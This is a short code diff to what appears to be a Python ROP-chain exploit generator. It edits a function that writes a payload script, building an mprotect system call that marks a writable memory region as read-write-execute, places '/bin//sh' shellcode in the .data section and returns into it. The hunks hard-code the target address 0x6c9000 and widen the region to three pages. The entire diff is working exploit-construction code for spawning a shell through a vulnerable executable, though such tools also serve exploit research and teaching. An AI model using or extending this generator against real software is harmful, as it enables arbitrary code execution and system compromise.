@@ -210,7 +210,7 @@ def mprotectROPChain(GadgetList, vulnExecutable):
 def case2(GadgetList, data_section_addr) : 
 
     # Open the file where the payload is written in the form of a python script
-    fd = open("mprotectROPgen.py", "w")
+    fd = open("mprotectROPChain.py", "w")
     chain.writeHeader(fd)
     
     # Step-2: Writing traditional shellcode into .data section
@@ -223,11 +223,16 @@ def case2(GadgetList, data_section_addr) :
     chain.LoadConstIntoReg(GadgetList, "rax", 10, fd)
 
 	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
-    chain.LoadConstIntoReg(GadgetList, "rdi", data_section_addr, fd)
+    # chain.LoadConstIntoReg(GadgetList, "rdi", data_section_addr, fd)
+    # chain.LoadConstIntoReg(GadgetList, "rdi", 0x6c9000, fd)
 
+    # 0x6c9000 is where Writable section starts.
+    # 4096 bytes from here are made executable
+    chain.LoadConstIntoReg(GadgetList, "rdi", 0x6c9000, fd)
 	# Step-4: rsi <- 100
     # Make the first 100 bytes of .data executable
-    chain.LoadConstIntoReg(GadgetList, "rsi", 100, fd)
+    # chain.LoadConstIntoReg(GadgetList, "rsi", 100, fd)
+    chain.LoadConstIntoReg(GadgetList, "rsi", 4096 * 3, fd)
 
     # Step-5: rdx <- 7
     # 7 - PROT_READ | PROT_WRITE | PROT_EXEC
@@ -249,7 +254,8 @@ def case2(GadgetList, data_section_addr) :
     fd.write("\n\t")
 
     fd.write("payload += struct.pack('<Q', ")
-    fd.write(hex(int(data_section_addr)))
+    # fd.write(hex(int(data_section_addr)))
+    fd.write(hex(data_section_addr))
     fd.write(")")
     fd.write("\t\t# Address of .data section where shellcode is present")
     fd.write("\n\t")
